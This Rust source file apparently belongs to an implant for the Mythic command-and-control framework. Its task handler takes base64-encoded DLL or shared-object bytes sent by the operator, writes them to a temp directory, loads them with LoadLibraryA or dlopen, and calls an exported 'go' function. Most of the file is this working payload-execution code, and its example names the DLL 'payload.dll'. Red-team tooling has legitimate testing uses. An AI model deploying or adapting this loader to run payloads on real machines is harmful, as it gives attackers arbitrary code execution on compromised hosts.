//! Dynamic library loading (cross-platform).
//!
//! Windows: `LoadLibraryA` / `GetProcAddress` / `FreeLibrary`
//! Linux:   `dlopen` / `dlsym` / `dlclose`
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "dll_name": "payload.dll",
//!     "function": "go",
//!     "args": "<base64_raw_args>",
//!     "dll_bytes": "<base64_encoded_dll>"
//! }
//! ```

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    /// File name used when writing the DLL to disk.
    dll_name: String,
    /// Export function to call (default: "go").
    #[serde(default = "default_function")]
    function: String,
    /// Raw arguments passed to the DLL function (optional).
    #[serde(default)]
    args: Option<String>,
    /// Base64-encoded DLL bytes.
    dll_bytes: String,
}

fn default_function() -> String {
    "go".into()
}

// ── Platform FFI ────────────────────────────────────────────

#[cfg(windows)]
mod ffi {
    use std::os::raw::c_void;

    #[link(name = "kernel32")]
    unsafe extern "system" {
        pub fn LoadLibraryA(lpLibFileName: *const u8) -> *mut c_void;
        pub fn GetProcAddress(hModule: *mut c_void, lpProcName: *const u8) -> *mut c_void;
        pub fn FreeLibrary(hModule: *mut c_void) -> i32;
    }
}

#[cfg(unix)]
mod ffi {
    use std::os::raw::{c_char, c_int, c_void};

    pub const RTLD_NOW: c_int = 2;
    pub const RTLD_GLOBAL: c_int = 256;

    unsafe extern "C" {
        pub fn dlopen(filename: *const c_char, flag: c_int) -> *mut c_void;
        pub fn dlsym(handle: *mut c_void, symbol: *const c_char) -> *mut c_void;
        pub fn dlclose(handle: *mut c_void) -> c_int;
        pub fn dlerror() -> *const c_char;
    }
}

// ── Fn pointer type ─────────────────────────────────────────

/// BOF/DLL convention: `void go(char *args, int len)` — C calling convention.
type EntryFn = unsafe extern "C" fn(*const u8, i32);

// ── Helpers ─────────────────────────────────────────────────

/// Decode base64, optionally with or without padding.
fn decode_b64(s: &str) -> Result<Vec<u8>, String> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(s.trim())
        .map_err(|e| format!("base64 decode failed: {e}"))
}

/// Build a temp file path from a filename.
#[cfg(windows)]
pub fn temp_path(name: &str) -> String {
    use std::env;
    let tmp = env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".into());
    format!("{}\\{name}", tmp.trim_end_matches('\\'))
}

#[cfg(unix)]
pub fn temp_path(name: &str) -> String {
    format!("/tmp/{name}")
}

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("run_dll parse error: {e}")),
    };

    // 1. Decode DLL bytes
    let dll_bytes = match decode_b64(&params.dll_bytes) {
        Ok(b) => b,
        Err(e) => return TaskResponse::failed(task.id, &e),
    };

    // 2. Write to temp file
    let path = temp_path(&params.dll_name);
    if let Err(e) = std::fs::write(&path, &dll_bytes) {
        return TaskResponse::failed(task.id, &format!("write DLL failed: {e}"));
    }
    println!("[run_dll] wrote {} bytes to {}", dll_bytes.len(), &path);

    // 3. Load library + get function pointer + call
    let result = load_and_call(&path, &params.function, params.args.as_deref());

    // 4. Cleanup (best-effort)
    let _ = std::fs::remove_file(&path);

    match result {
        Ok(msg) => TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some("completed".into()),
            user_output: Some(msg),
            ..Default::default()
        },
        Err(e) => TaskResponse::failed(task.id, &e),
    }
}

// ── Platform-specific load + call ───────────────────────────

#[cfg(windows)]
pub fn load_and_call(path: &str, function: &str, args: Option<&str>) -> Result<String, String> {
    use std::ffi::CString;

    let dll_cstr = CString::new(path).map_err(|e| format!("invalid DLL path: {e}"))?;
    let func_cstr = CString::new(function).map_err(|e| format!("invalid function name: {e}"))?;

    // Load
    let handle = unsafe { ffi::LoadLibraryA(dll_cstr.as_ptr() as *const u8) };
    if handle.is_null() {
        return Err(format!("LoadLibraryA({path}) failed"));
    }

    // Lookup
    let addr = unsafe { ffi::GetProcAddress(handle, func_cstr.as_ptr() as *const u8) };
    if addr.is_null() {
        unsafe { ffi::FreeLibrary(handle) };
        return Err(format!("GetProcAddress({function}) failed"));
    }

    // Call (BOF convention: void f(char*, int))
    let (arg_ptr, arg_len) = match args {
        Some(a) => (a.as_ptr(), a.len() as i32),
        None => (std::ptr::null(), 0),
    };
    let func: EntryFn = unsafe { std::mem::transmute(addr) };
    unsafe { func(arg_ptr, arg_len) };

    // Don't free the library — it may have spawned threads, etc.
    // unsafe { ffi::FreeLibrary(handle) };

    Ok(format!("DLL {path} → {function}() called successfully"))
}

#[cfg(unix)]
pub fn load_and_call(path: &str, function: &str, args: Option<&str>) -> Result<String, String> {
    use std::ffi::CString;

    let path_cstr = CString::new(path).map_err(|e| format!("invalid path: {e}"))?;
    let func_cstr = CString::new(function).map_err(|e| format!("invalid function name: {e}"))?;

    // Load
    let handle = unsafe { ffi::dlopen(path_cstr.as_ptr(), ffi::RTLD_NOW | ffi::RTLD_GLOBAL) };
    if handle.is_null() {
        let err = unsafe { std::ffi::CStr::from_ptr(ffi::dlerror()) };
        return Err(format!("dlopen({path}) failed: {}", err.to_string_lossy()));
    }

    // Lookup
    let addr = unsafe { ffi::dlsym(handle, func_cstr.as_ptr()) };
    if addr.is_null() {
        let err = unsafe { std::ffi::CStr::from_ptr(ffi::dlerror()) };
        unsafe { ffi::dlclose(handle) };
        return Err(format!(
            "dlsym({function}) failed: {}",
            err.to_string_lossy()
        ));
    }

    // Call (BOF convention: void f(char*, int))
    let (arg_ptr, arg_len) = match args {
        Some(a) => (a.as_ptr(), a.len() as i32),
        None => (std::ptr::null(), 0),
    };
    let func: EntryFn = unsafe { std::mem::transmute(addr) };
    unsafe { func(arg_ptr, arg_len) };

    // Keep library loaded (may have side effects)
    Ok(format!("SO {path} → {function}() called successfully"))
}

// ── Tests ───────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_decode_b64_roundtrip() {
        use base64::Engine;
        let data = b"hello world";
        let encoded = base64::engine::general_purpose::STANDARD.encode(data);
        let decoded = decode_b64(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_temp_path() {
        let p = temp_path("foo.dll");
        assert!(p.contains("foo.dll"));
        assert!(!p.is_empty());
    }
}
